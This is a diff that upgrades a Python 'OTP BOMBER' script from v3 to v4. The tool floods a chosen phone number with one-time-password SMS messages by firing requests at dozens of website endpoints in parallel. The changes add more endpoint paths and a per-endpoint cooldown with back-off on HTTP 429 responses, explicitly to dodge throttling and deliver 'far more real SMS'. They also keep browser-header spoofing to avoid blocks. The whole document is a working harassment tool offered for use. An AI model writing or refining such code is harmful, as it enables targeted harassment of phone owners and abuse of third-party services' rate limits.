@@ -1,11 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-OTP BOMBER v3
+OTP BOMBER v4
 =============
 Enter phone number -> enter rounds -> done.
 
-Fixes over v2:
+New in v4:
+  * PROBE_PATHS expanded to 36 paths (added the whole /v1/ and /v2/ family)
+  * PROBE_LIMIT raised so the whole list is really used
+  * per-endpoint cooldown + 429 back-off -> far fewer throttles, far more real SMS
+
+Kept from v3:
   * browser-like headers (Origin / Referer) -> fewer 403
   * strict verdict: an HTML "200" no longer counts as success
   * phone is ALWAYS sent in international format
@@ -35,7 +40,8 @@ WORKERS       = 80
 ROUND_SECONDS = 30
 TIMEOUT       = 10
 COUNTRY_CODE  = "972"
-PROBE_LIMIT   = 40
+PROBE_LIMIT   = 40      # must be >= len(PROBE_PATHS)
+COOLDOWN      = 1.0     # seconds between two requests to the SAME endpoint
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")
@@ -120,7 +126,7 @@ def headers_for(url):
 
 
 def parse_line(line):
-    """-> dict(url, method, payload) or None"""
+    """-> list of dicts(url, method, payload) or None"""
     parts = [x.strip() for x in line.split("|")]
     first = parts[0]
     if not first:
@@ -212,7 +218,6 @@ def verdict(r):
     if "json" in ct:
         return "maybe" if any(b in body for b in BAD_WORDS) else "live"
 
-    # HTML page returned with 200 -> only trust it if it mentions OTP
     if any(w in body for w in OTP_WORDS):
         return "maybe"
     return "dead"
@@ -261,26 +266,40 @@ def run_round(endpoints, budget):
     deadline = time.time() + budget
     st = {"sent": 0, "ok": 0, "thr": 0, "fail": 0}
     n = len(endpoints)
+    nxt = [0.0] * n            # earliest time each endpoint may be hit again
     idx = 0
     ex = ThreadPoolExecutor(max_workers=WORKERS)
-    pending = set()
+    pending = {}
     last = time.time()
 
     try:
         while True:
             now = time.time()
             while len(pending) < WORKERS and now < deadline:
-                e = endpoints[idx % n]
-                idx += 1
-                pending.add(ex.submit(fire, e, e.get("phone", PHONES[0])))
+                picked = False
+                for _ in range(n):
+                    i = idx % n
+                    idx += 1
+                    if nxt[i] <= now:
+                        nxt[i] = now + COOLDOWN
+                        e = endpoints[i]
+                        pending[ex.submit(fire, e, e.get("phone", PHONES[0]))] = i
+                        picked = True
+                        break
+                if not picked:
+                    break
                 now = time.time()
 
             if not pending:
-                break
+                if time.time() >= deadline:
+                    break
+                time.sleep(0.02)
+                continue
 
-            done, pending = wait(pending, timeout=0.15,
-                                 return_when=FIRST_COMPLETED)
+            done, _ = wait(list(pending.keys()), timeout=0.1,
+                           return_when=FIRST_COMPLETED)
             for f in done:
+                i = pending.pop(f, None)
                 st["sent"] += 1
                 r = f.result()
                 if r is None:
@@ -289,6 +308,8 @@ def run_round(endpoints, budget):
                     st["ok"] += 1
                 elif r.status_code == 429:
                     st["thr"] += 1
+                    if i is not None:
+                        nxt[i] = time.time() + COOLDOWN * 3
                 else:
                     st["fail"] += 1
 
@@ -309,7 +330,7 @@ def run_round(endpoints, budget):
 
 def main():
     print("=" * 56)
-    print("               O T P   B O M B E R   v3")
+    print("               O T P   B O M B E R   v4")
     print("=" * 56)
 
     if not os.path.exists(SITES_FILE):
@@ -329,7 +350,6 @@ def main():
     except ValueError:
         rounds = 1
 
-    # reuse a recent scan if sites.txt has not changed
     alive = None
     if os.path.exists(ALIVE_FILE) and \
             os.path.getmtime(ALIVE_FILE) >= os.path.getmtime(SITES_FILE):
